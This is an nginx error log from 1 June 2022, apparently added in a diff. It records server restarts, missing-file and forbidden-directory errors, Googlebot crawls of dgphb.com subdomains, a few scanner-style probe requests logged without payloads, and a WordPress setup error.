@@ -1,0 +1,618 @@
+2022/06/01 12:36:26 [notice] 1#1: using the "epoll" event method
+2022/06/01 12:36:26 [notice] 1#1: nginx/1.21.6
+2022/06/01 12:36:26 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 12:36:26 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 12:36:26 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 12:36:26 [notice] 1#1: start worker processes
+2022/06/01 12:36:26 [notice] 1#1: start worker process 23
+2022/06/01 12:37:03 [error] 23#23: *2 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 203.166.220.189, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "www.dgphb.com", referrer: "http://www.dgphb.com/"
+2022/06/01 12:37:38 [error] 23#23: *4 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.32, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "896.dgphb.com"
+2022/06/01 12:37:44 [error] 23#23: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.18.0.2:9000", host: "www.dgphb.com"
+2022/06/01 12:39:20 [error] 23#23: *7 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.18.0.2:9000", host: "www.dgphb.com"
+2022/06/01 12:41:39 [error] 23#23: *10 open() "/usr/share/nginx/html/a.html" failed (2: No such file or directory), client: 203.166.220.189, server: localhost, request: "GET /a.html HTTP/1.1", host: "www.dgphb.com"
+2022/06/01 12:45:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 12:45:54 [notice] 23#23: gracefully shutting down
+2022/06/01 12:45:54 [notice] 23#23: exiting
+2022/06/01 12:45:54 [notice] 23#23: exit
+2022/06/01 12:45:54 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 12:45:54 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 12:45:54 [notice] 1#1: exit
+2022/06/01 12:45:59 [notice] 1#1: using the "epoll" event method
+2022/06/01 12:45:59 [notice] 1#1: nginx/1.21.6
+2022/06/01 12:45:59 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 12:45:59 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 12:45:59 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 12:45:59 [notice] 1#1: start worker processes
+2022/06/01 12:45:59 [notice] 1#1: start worker process 23
+2022/06/01 12:49:05 [error] 23#23: *14 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 203.166.220.189, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/"
+2022/06/01 12:49:13 [error] 23#23: *13 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.19.0.2:9000", host: "159.75.219.167"
+2022/06/01 12:50:52 [error] 23#23: *17 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.19.0.1, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.19.0.2:9000", host: "localhost"
+2022/06/01 12:57:37 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 12:57:37 [notice] 23#23: gracefully shutting down
+2022/06/01 12:57:37 [notice] 23#23: exiting
+2022/06/01 12:57:37 [notice] 23#23: exit
+2022/06/01 12:57:37 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 12:57:37 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 12:57:37 [notice] 1#1: exit
+2022/06/01 12:57:38 [notice] 1#1: using the "epoll" event method
+2022/06/01 12:57:38 [notice] 1#1: nginx/1.21.6
+2022/06/01 12:57:38 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 12:57:38 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 12:57:38 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 12:57:38 [notice] 1#1: start worker processes
+2022/06/01 12:57:38 [notice] 1#1: start worker process 23
+2022/06/01 12:57:43 [error] 23#23: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.19.0.2:9000", host: "159.75.219.167"
+2022/06/01 12:59:11 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 12:59:11 [notice] 23#23: gracefully shutting down
+2022/06/01 12:59:11 [notice] 23#23: exiting
+2022/06/01 12:59:11 [notice] 23#23: exit
+2022/06/01 12:59:11 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 12:59:11 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 12:59:11 [notice] 1#1: exit
+2022/06/01 12:59:15 [notice] 1#1: using the "epoll" event method
+2022/06/01 12:59:15 [notice] 1#1: nginx/1.21.6
+2022/06/01 12:59:15 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 12:59:15 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 12:59:15 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 12:59:15 [notice] 1#1: start worker processes
+2022/06/01 12:59:15 [notice] 1#1: start worker process 23
+2022/06/01 12:59:24 [error] 23#23: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "159.75.219.167"
+2022/06/01 13:00:08 [error] 23#23: *4 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.47, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.8570.dgphb.com"
+2022/06/01 13:01:15 [error] 23#23: *6 open() "/usr/share/nginx/html/a.html" failed (2: No such file or directory), client: 203.166.220.189, server: localhost, request: "GET /a.html HTTP/1.1", host: "159.75.219.167"
+2022/06/01 13:03:33 [error] 23#23: *8 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "159.75.219.167"
+2022/06/01 13:05:42 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 13:05:42 [notice] 23#23: gracefully shutting down
+2022/06/01 13:05:42 [notice] 23#23: exiting
+2022/06/01 13:05:42 [notice] 23#23: exit
+2022/06/01 13:05:42 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 13:05:42 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 13:05:42 [notice] 1#1: exit
+2022/06/01 13:05:46 [notice] 1#1: using the "epoll" event method
+2022/06/01 13:05:46 [notice] 1#1: nginx/1.21.6
+2022/06/01 13:05:46 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 13:05:46 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 13:05:46 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 13:05:46 [notice] 1#1: start worker processes
+2022/06/01 13:05:46 [notice] 1#1: start worker process 23
+2022/06/01 13:07:04 [error] 23#23: *4 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 223.104.68.44, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/info.php"
+2022/06/01 13:07:09 [error] 23#23: *6 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 223.104.68.44, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/info.php"
+2022/06/01 13:07:15 [error] 23#23: *10 directory index of "/usr/share/nginx/html/" is forbidden, client: 180.163.220.67, server: localhost, request: "GET / HTTP/1.1", host: "159.75.219.167", referrer: "http://baidu.com/"
+2022/06/01 13:07:22 [error] 23#23: *12 directory index of "/usr/share/nginx/html/" is forbidden, client: 42.236.10.75, server: localhost, request: "GET / HTTP/1.1", host: "159.75.219.167", referrer: "http://baidu.com/"
+2022/06/01 13:10:32 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 13:10:32 [notice] 23#23: gracefully shutting down
+2022/06/01 13:10:32 [notice] 23#23: exiting
+2022/06/01 13:10:32 [notice] 23#23: exit
+2022/06/01 13:10:32 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 13:10:32 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 13:10:32 [notice] 1#1: exit
+2022/06/01 13:10:37 [notice] 1#1: using the "epoll" event method
+2022/06/01 13:10:37 [notice] 1#1: nginx/1.21.6
+2022/06/01 13:10:37 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 13:10:37 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 13:10:37 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 13:10:37 [notice] 1#1: start worker processes
+2022/06/01 13:10:37 [notice] 1#1: start worker process 23
+2022/06/01 13:10:41 [error] 23#23: *2 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.22.0.2:9000", host: "159.75.219.167"
+2022/06/01 13:10:43 [error] 23#23: *4 directory index of "/usr/share/nginx/html/" is forbidden, client: 36.99.136.143, server: localhost, request: "GET / HTTP/1.1", host: "www.dgphb.com"
+2022/06/01 13:10:43 [error] 23#23: *5 directory index of "/usr/share/nginx/html/" is forbidden, client: 36.99.136.142, server: localhost, request: "GET / HTTP/1.1", host: "www.dgphb.com"
+2022/06/01 13:10:47 [error] 23#23: *2 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.22.0.2:9000", host: "159.75.219.167"
+2022/06/01 13:10:50 [error] 23#23: *2 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.22.0.2:9000", host: "159.75.219.167"
+2022/06/01 13:11:23 [error] 23#23: *8 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.46, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.114677.dgphb.com"
+2022/06/01 13:11:24 [error] 23#23: *9 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.46, server: localhost, request: "GET / HTTP/1.1", host: "m.114677.dgphb.com"
+2022/06/01 13:12:42 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 13:12:42 [notice] 23#23: gracefully shutting down
+2022/06/01 13:12:42 [notice] 23#23: exiting
+2022/06/01 13:12:42 [notice] 23#23: exit
+2022/06/01 13:12:42 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 13:12:42 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 13:12:42 [notice] 1#1: exit
+2022/06/01 13:12:47 [notice] 1#1: using the "epoll" event method
+2022/06/01 13:12:47 [notice] 1#1: nginx/1.21.6
+2022/06/01 13:12:47 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 13:12:47 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 13:12:47 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 13:12:47 [notice] 1#1: start worker processes
+2022/06/01 13:12:47 [notice] 1#1: start worker process 23
+2022/06/01 13:12:49 [error] 23#23: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.23.0.2:9000", host: "159.75.219.167"
+2022/06/01 13:12:55 [error] 23#23: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 203.166.220.189, server: localhost, request: "GET /info.php HTTP/1.1", upstream: "fastcgi://172.23.0.2:9000", host: "159.75.219.167"
+2022/06/01 13:13:21 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 13:13:21 [notice] 23#23: gracefully shutting down
+2022/06/01 13:13:21 [notice] 23#23: exiting
+2022/06/01 13:13:21 [notice] 23#23: exit
+2022/06/01 13:13:21 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 13:13:21 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 13:13:21 [notice] 1#1: exit
+2022/06/01 13:13:25 [notice] 1#1: using the "epoll" event method
+2022/06/01 13:13:25 [notice] 1#1: nginx/1.21.6
+2022/06/01 13:13:25 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 13:13:25 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 13:13:25 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 13:13:25 [notice] 1#1: start worker processes
+2022/06/01 13:13:25 [notice] 1#1: start worker process 23
+2022/06/01 13:19:18 [error] 23#23: *4 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 123.139.90.112, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "159.75.219.167:90"
+2022/06/01 13:22:38 [error] 23#23: *5 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.72, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.99177.dgphb.com"
+2022/06/01 13:22:38 [error] 23#23: *6 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.69, server: localhost, request: "GET / HTTP/1.1", host: "m.99177.dgphb.com"
+2022/06/01 13:33:53 [error] 23#23: *7 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.230, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.3629.dgphb.com"
+2022/06/01 13:33:57 [error] 23#23: *8 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.232, server: localhost, request: "GET / HTTP/1.1", host: "m.3629.dgphb.com"
+2022/06/01 13:38:38 [error] 23#23: *9 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.51, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "62068.dgphb.com"
+2022/06/01 13:38:40 [error] 23#23: *10 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.51, server: localhost, request: "GET / HTTP/1.1", host: "62068.dgphb.com"
+2022/06/01 13:39:31 [error] 23#23: *11 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.94, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.19474.dgphb.com"
+2022/06/01 13:39:31 [error] 23#23: *12 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.68.94, server: localhost, request: "GET / HTTP/1.1", host: "m.19474.dgphb.com"
+2022/06/01 13:41:45 [error] 23#23: *13 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 123.134.59.188, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "167.219.75.159:80"
+2022/06/01 13:43:01 [error] 23#23: *14 directory index of "/usr/share/nginx/html/" is forbidden, client: 163.177.13.2, server: localhost, request: "HEAD / HTTP/1.1", host: "159.75.219.167"
+2022/06/01 13:45:08 [error] 23#23: *15 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.21, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.7944.dgphb.com"
+2022/06/01 13:45:09 [error] 23#23: *16 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.21, server: localhost, request: "GET / HTTP/1.1", host: "m.7944.dgphb.com"
+2022/06/01 13:49:05 [error] 23#23: *17 directory index of "/usr/share/nginx/html/" is forbidden, client: 193.124.7.9, server: localhost, request: "GET http://example.com/ HTTP/1.1", host: "example.com"
+2022/06/01 13:50:45 [error] 23#23: *19 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.29, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.28118.dgphb.com"
+2022/06/01 13:50:46 [error] 23#23: *20 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.25, server: localhost, request: "GET / HTTP/1.1", host: "m.28118.dgphb.com"
+2022/06/01 13:54:10 [error] 23#23: *21 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 223.104.68.44, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/info.php"
+2022/06/01 13:56:23 [error] 23#23: *24 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.222, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5944.dgphb.com"
+2022/06/01 13:56:25 [error] 23#23: *25 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.220, server: localhost, request: "GET / HTTP/1.1", host: "m.5944.dgphb.com"
+2022/06/01 13:58:36 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 13:58:36 [notice] 23#23: gracefully shutting down
+2022/06/01 13:58:36 [notice] 23#23: exiting
+2022/06/01 13:58:36 [notice] 23#23: exit
+2022/06/01 13:58:36 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 13:58:36 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 13:58:36 [notice] 1#1: exit
+2022/06/01 13:59:37 [notice] 1#1: using the "epoll" event method
+2022/06/01 13:59:37 [notice] 1#1: nginx/1.21.6
+2022/06/01 13:59:37 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 13:59:37 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 13:59:37 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 13:59:37 [notice] 1#1: start worker processes
+2022/06/01 13:59:37 [notice] 1#1: start worker process 23
+2022/06/01 14:01:32 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 14:01:32 [notice] 23#23: gracefully shutting down
+2022/06/01 14:01:32 [notice] 23#23: exiting
+2022/06/01 14:01:32 [notice] 23#23: exit
+2022/06/01 14:01:32 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 14:01:32 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 14:01:32 [notice] 1#1: exit
+2022/06/01 14:01:33 [notice] 1#1: using the "epoll" event method
+2022/06/01 14:01:33 [notice] 1#1: nginx/1.21.6
+2022/06/01 14:01:33 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 14:01:33 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 14:01:33 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 14:01:33 [notice] 1#1: start worker processes
+2022/06/01 14:01:33 [notice] 1#1: start worker process 23
+2022/06/01 14:01:47 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 14:01:47 [notice] 23#23: gracefully shutting down
+2022/06/01 14:01:47 [notice] 23#23: exiting
+2022/06/01 14:01:47 [notice] 23#23: exit
+2022/06/01 14:01:47 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 14:01:47 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 14:01:47 [notice] 1#1: exit
+2022/06/01 14:02:05 [notice] 1#1: using the "epoll" event method
+2022/06/01 14:02:05 [notice] 1#1: nginx/1.21.6
+2022/06/01 14:02:05 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 14:02:05 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 14:02:05 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 14:02:05 [notice] 1#1: start worker processes
+2022/06/01 14:02:05 [notice] 1#1: start worker process 23
+2022/06/01 14:07:38 [error] 23#23: *4 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.106, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.4199.dgphb.com"
+2022/06/01 14:07:38 [error] 23#23: *5 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.75, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.154094.dgphb.com"
+2022/06/01 14:07:41 [error] 23#23: *6 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.106, server: localhost, request: "GET / HTTP/1.1", host: "m.4199.dgphb.com"
+2022/06/01 14:07:41 [error] 23#23: *7 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.68.75, server: localhost, request: "GET / HTTP/1.1", host: "m.154094.dgphb.com"
+2022/06/01 14:11:23 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 14:11:23 [notice] 23#23: gracefully shutting down
+2022/06/01 14:11:23 [notice] 23#23: exiting
+2022/06/01 14:11:23 [notice] 23#23: exit
+2022/06/01 14:11:23 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 14:11:23 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 14:11:23 [notice] 1#1: exit
+2022/06/01 14:11:28 [notice] 1#1: using the "epoll" event method
+2022/06/01 14:11:28 [notice] 1#1: nginx/1.21.6
+2022/06/01 14:11:28 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 14:11:28 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 14:11:28 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 14:11:28 [notice] 1#1: start worker processes
+2022/06/01 14:11:28 [notice] 1#1: start worker process 23
+2022/06/01 14:13:15 [error] 23#23: *7 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.202, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.4407.dgphb.com"
+2022/06/01 14:13:16 [error] 23#23: *8 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.204, server: localhost, request: "GET / HTTP/1.1", host: "m.4407.dgphb.com"
+2022/06/01 14:18:06 [error] 23#23: *19 directory index of "/usr/share/nginx/html/" is forbidden, client: 203.166.220.189, server: localhost, request: "GET / HTTP/1.1", host: "159.75.219.167"
+2022/06/01 14:18:54 [error] 23#23: *21 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.59, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5341.dgphb.com"
+2022/06/01 14:18:55 [error] 23#23: *22 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.68.61, server: localhost, request: "GET / HTTP/1.1", host: "m.5341.dgphb.com"
+2022/06/01 14:38:40 [error] 23#23: *24 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.205, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.962.dgphb.com"
+2022/06/01 14:38:42 [error] 23#23: *25 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.203, server: localhost, request: "GET / HTTP/1.1", host: "m.962.dgphb.com"
+2022/06/01 14:44:16 [error] 23#23: *26 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.47, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.3900.dgphb.com"
+2022/06/01 14:44:17 [error] 23#23: *27 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.68.47, server: localhost, request: "GET / HTTP/1.1", host: "m.3900.dgphb.com"
+2022/06/01 14:45:25 [error] 23#23: *28 open() "/usr/share/nginx/html/seas.htm" failed (2: No such file or directory), client: 203.166.220.189, server: localhost, request: "GET /seas.htm HTTP/1.1", host: "159.75.219.167"
+2022/06/01 14:45:27 [error] 23#23: *28 open() "/usr/share/nginx/html/seas.html" failed (2: No such file or directory), client: 203.166.220.189, server: localhost, request: "GET /seas.html HTTP/1.1", host: "159.75.219.167"
+2022/06/01 14:49:54 [error] 23#23: *30 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.87, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.21945.dgphb.com"
+2022/06/01 14:49:55 [error] 23#23: *31 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.68.85, server: localhost, request: "GET / HTTP/1.1", host: "m.21945.dgphb.com"
+2022/06/01 14:53:01 [error] 23#23: *32 directory index of "/usr/share/nginx/html/" is forbidden, client: 81.71.60.219, server: localhost, request: "GET / HTTP/1.1", host: "www.dgphb.com"
+2022/06/01 14:55:31 [error] 23#23: *33 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.78, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.107972.dgphb.com"
+2022/06/01 14:55:32 [error] 23#23: *34 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.68.76, server: localhost, request: "GET / HTTP/1.1", host: "m.107972.dgphb.com"
+2022/06/01 15:08:39 [error] 23#23: *35 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.80, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "42877.dgphb.com"
+2022/06/01 15:08:40 [error] 23#23: *36 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.68.80, server: localhost, request: "GET / HTTP/1.1", host: "42877.dgphb.com"
+2022/06/01 15:16:09 [error] 23#23: *37 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.87, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6202.dgphb.com"
+2022/06/01 15:16:10 [error] 23#23: *38 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.68.89, server: localhost, request: "GET / HTTP/1.1", host: "m.6202.dgphb.com"
+2022/06/01 15:17:45 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/06/01 15:17:45 [notice] 23#23: gracefully shutting down
+2022/06/01 15:17:45 [notice] 23#23: exiting
+2022/06/01 15:17:45 [notice] 23#23: exit
+2022/06/01 15:17:45 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2022/06/01 15:17:45 [notice] 1#1: worker process 23 exited with code 0
+2022/06/01 15:17:45 [notice] 1#1: exit
+2022/06/01 15:18:19 [notice] 1#1: using the "epoll" event method
+2022/06/01 15:18:19 [notice] 1#1: nginx/1.21.6
+2022/06/01 15:18:19 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/06/01 15:18:19 [notice] 1#1: OS: Linux 5.4.0-109-generic
+2022/06/01 15:18:19 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/06/01 15:18:19 [notice] 1#1: start worker processes
+2022/06/01 15:18:19 [notice] 1#1: start worker process 23
+2022/06/01 15:23:39 [error] 23#23: *1 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.215, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.54263.dgphb.com"
+2022/06/01 15:23:40 [error] 23#23: *2 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.213, server: localhost, request: "GET / HTTP/1.1", host: "m.54263.dgphb.com"
+2022/06/01 15:31:09 [error] 23#23: *3 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.240, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.89082.dgphb.com"
+2022/06/01 15:31:10 [error] 23#23: *4 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.242, server: localhost, request: "GET / HTTP/1.1", host: "m.89082.dgphb.com"
+2022/06/01 15:34:27 [error] 23#23: *5 directory index of "/usr/share/nginx/html/" is forbidden, client: 37.0.10.187, server: localhost, request: "GET / HTTP/1.1", host: "159.75.219.167:80"
+2022/06/01 15:34:34 [error] 23#23: *6 "/usr/share/nginx/html/HNAP1/index.php" is not found (2: No such file or directory), client: 37.0.10.187, server: localhost, request: "POST /HNAP1/ HTTP/1.1", host: "159.75.219.167:80"
+2022/06/01 15:37:42 [error] 23#23: *7 directory index of "/usr/share/nginx/html/" is forbidden, client: 2.58.149.222, server: localhost, request: "GET / HTTP/1.1", host: "159.75.219.167:80"
+2022/06/01 15:46:17 [error] 23#23: *13 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/install.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167"
+2022/06/01 15:50:19 [error] 23#23: *26 FastCGI sent in stderr: "PHP message: 查询SELECT wp_时，WordPress数据库发生Unknown column 'wp_' in 'field list'错误" while reading response header from upstream, client: 183.46.202.171, server: localhost, request: "POST /paihangbang/wp-admin/setup-config.php?step=2 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/setup-config.php?step=1&language=zh_CN"
